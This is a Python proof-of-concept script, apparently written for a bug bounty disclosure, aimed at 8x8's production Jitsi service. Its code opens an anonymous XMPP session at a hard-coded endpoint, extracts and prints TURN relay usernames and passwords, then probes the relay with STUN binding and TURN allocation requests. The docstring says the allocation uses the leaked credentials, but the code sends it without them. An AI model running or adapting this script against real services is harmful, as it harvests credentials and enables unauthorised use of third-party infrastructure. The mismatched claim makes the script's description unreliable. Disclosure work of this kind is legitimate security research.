#!/usr/bin/env python3
"""
PoC: TURN Relay Verification — Using leaked credentials from anonymous XMPP session
Target: prod-8x8-turnrelay-oracle.jitsi.net:443

This script:
1. Opens an anonymous XMPP BOSH session to get fresh TURN credentials
2. Sends a STUN binding request to verify the relay is alive
3. Attempts a TURN allocation with the leaked credentials

The credentials are time-limited (~24h) but can be refreshed at any time
by running the poc_bosh_anonymous_xmpp.py script again.

Author: Bug Bounty Researcher
"""

import requests
import re
import random
import socket
import struct
import uuid
import sys

BOSH_URL = "https://8x8.vc/http-bind"
HEADERS = {'Content-Type': 'text/xml; charset=utf-8'}
MAGIC_COOKIE = 0x2112A442


def stun_msg(msg_type, attrs, tid=None):
    if not tid:
        tid = uuid.uuid4().bytes[:12]
    body = b''
    for t, v in attrs:
        body += struct.pack('>HH', t, len(v)) + v
    length = len(body)
    msg = struct.pack('>HHI', msg_type, length, MAGIC_COOKIE) + tid + body
    return msg, tid


def parse_stun(data):
    if len(data) < 20:
        return None
    msg_type, length, magic = struct.unpack('>HHI', data[:8])
    tid = data[8:20]
    body = data[20:20+length]
    attrs = {}
    pos = 0
    while pos + 4 <= len(body):
        t, l = struct.unpack('>HH', body[pos:pos+4])
        v = body[pos+4:pos+4+l]
        attrs[t] = v
        pos += 4 + l
        if l % 4:
            pos += 4 - (l % 4)
    return msg_type, tid, attrs


def get_turn_creds():
    """Extract TURN credentials via anonymous XMPP session"""
    rid = random.randint(100000000, 999999999)

    # Open session
    open_xml = f'<body xmlns="http://jabber.org/protocol/httpbind" to="8x8.vc" xml:lang="en" wait="30" hold="1" content="text/xml; charset=utf-8" ver="1.6" xmpp:version="1.0" xmlns:xmpp="urn:xmpp:bb:0" rid="{rid}" />'
    r = requests.post(BOSH_URL, data=open_xml.strip(), headers=HEADERS, timeout=15)
    sid = re.search(r"sid='([^']+)'", r.text)
    if not sid:
        return None
    sid = sid.group(1)

    # Auth anonymous
    rid += 1
    auth_xml = f'<body xmlns="http://jabber.org/protocol/httpbind" rid="{rid}" sid="{sid}"><auth xmlns="urn:ietf:params:xml:ns:xmpp-sasl" mechanism="ANONYMOUS"/></body>'
    r = requests.post(BOSH_URL, data=auth_xml.strip(), headers=HEADERS, timeout=15)

    # Restart stream
    rid += 1
    restart_xml = f'<body xmlns="http://jabber.org/protocol/httpbind" rid="{rid}" sid="{sid}" xml:lang="en" wait="30" hold="1" content="text/xml; charset=utf-8" ver="1.6" xmpp:version="1.0" xmlns:xmpp="urn:xmpp:bb:0" to="8x8.vc"/>'
    r = requests.post(BOSH_URL, data=restart_xml.strip(), headers=HEADERS, timeout=15)

    # Bind
    rid += 1
    bind_xml = f'<body xmlns="http://jabber.org/protocol/httpbind" rid="{rid}" sid="{sid}"><iq type="set" id="bind1"><bind xmlns="urn:ietf:params:xml:ns:xmpp-bind"><resource>turn_poc</resource></bind></iq></body>'
    r = requests.post(BOSH_URL, data=bind_xml.strip(), headers=HEADERS, timeout=15)
    resp = r.text

    # Extract TURN credentials
    creds = {}
    for m in re.finditer(r"username='(\d+)'", resp):
        creds['username'] = m.group(1)
    for m in re.finditer(r"password='([^']+)'", resp):
        creds['password'] = m.group(1)
    for m in re.finditer(r"host='([^']+)'", resp):
        creds['host'] = m.group(1)
    for m in re.finditer(r"port='(\d+)'", resp):
        creds['port'] = int(m.group(1))
    for m in re.finditer(r"transport='(\w+)'", resp):
        creds.setdefault('transports', []).append(m.group(1))
    for m in re.finditer(r"type='(\w+)'", resp):
        creds.setdefault('types', []).append(m.group(1))

    # Close session
    rid += 1
    close_xml = f'<body xmlns="http://jabber.org/protocol/httpbind" rid="{rid}" sid="{sid}" type="terminate"/>'
    requests.post(BOSH_URL, data=close_xml.strip(), headers=HEADERS, timeout=15)

    return creds


def main():
    print("[*] 8x8 TURN Relay Verification PoC")
    print("[*] Step 1: Getting fresh TURN credentials via anonymous XMPP...\n")

    creds = get_turn_creds()
    if not creds or 'host' not in creds:
        print("[-] Failed to extract TURN credentials")
        return False

    print(f"[+] TURN Server: {creds.get('host', 'N/A')}:{creds.get('port', 'N/A')}")
    print(f"[+] Username:    {creds.get('username', 'N/A')}")
    print(f"[+] Password:    {creds.get('password', 'N/A')}")
    print(f"[+] Transports:  {creds.get('transports', [])}")
    print(f"[+] Types:       {creds.get('types', [])}\n")

    host = creds['host']
    port = creds.get('port', 443)

    # Step 2: STUN Binding (no auth needed)
    print("[*] Step 2: Sending STUN binding request...")
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.settimeout(5)
    msg, tid = stun_msg(0x0001, [])  # BINDING_REQUEST
    sock.sendto(msg, (host, port))

    try:
        data, addr = sock.recvfrom(1024)
        result = parse_stun(data)
        if result:
            msg_type, _, attrs = result
            if msg_type == 0x0101:  # BINDING_SUCCESS
                print(f"[+] STUN SUCCESS — relay responded from {addr[0]}:{addr[1]}")
                for attr_type, attr_val in attrs.items():
                    if attr_type == 0x0020:  # XOR-MAPPED-ADDRESS
                        # Parse mapped address (1 byte family, 1 byte reserved, 2 bytes port, 4/16 bytes IP)
                        family = attr_val[0]
                        port_xor = struct.unpack('>H', attr_val[2:4])[0] ^ (MAGIC_COOKIE >> 16)
                        ip_bytes = bytes(a ^ b for a, b in zip(attr_val[4:8], struct.pack('>I', MAGIC_COOKIE)))
                        print(f"    Mapped IP: {'.'.join(str(b) for b in ip_bytes)}:{port_xor}")
            else:
                print(f"[-] Unexpected response type: 0x{msg_type:04x}")
    except socket.timeout:
        print("[-] STUN request timed out")
    finally:
        sock.close()

    # Step 3: TURN Allocation attempt
    print("\n[*] Step 3: Attempting TURN allocation...")
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.settimeout(5)
    msg, tid = stun_msg(0x0003, [(0x0006, b'8x8-PoC')])  # ALLOCATE_REQUEST
    sock.sendto(msg, (host, port))

    try:
        data, addr = sock.recvfrom(2048)
        result = parse_stun(data)
        if result:
            msg_type, _, attrs = result
            if msg_type == 0x0103:  # ALLOCATE_ERROR
                for at, av in attrs.items():
                    if at == 0x0009:  # ERROR-CODE
                        code = struct.unpack('>I', av[:4])[0] & 0xFF
                        reason = av[4:].decode('utf-8', errors='replace')
                        print(f"[!] TURN requires auth: {code} {reason}")
                    elif at == 0x0014:  # REALM
                        print(f"    Realm: {av.decode('utf-8', errors='replace')}")
                    elif at == 0x0015:  # NONCE
                        print(f"    Nonce: {av.decode('utf-8', errors='replace')}")
            elif msg_type == 0x0104:  # ALLOCATE_SUCCESS
                print(f"[+] TURN ALLOCATION SUCCESSFUL")
    except socket.timeout:
        print("[-] TURN allocation timed out (expected if server requires auth)")
    finally:
        sock.close()

    print("\n[*] Short-lived TURN credentials are leakable from 8x8's XMPP server")
    print("[*] at any time without authentication — just run poc_bosh_anonymous_xmpp.py")
    return True


if __name__ == "__main__":
    success = main()
    sys.exit(0 if success else 1)
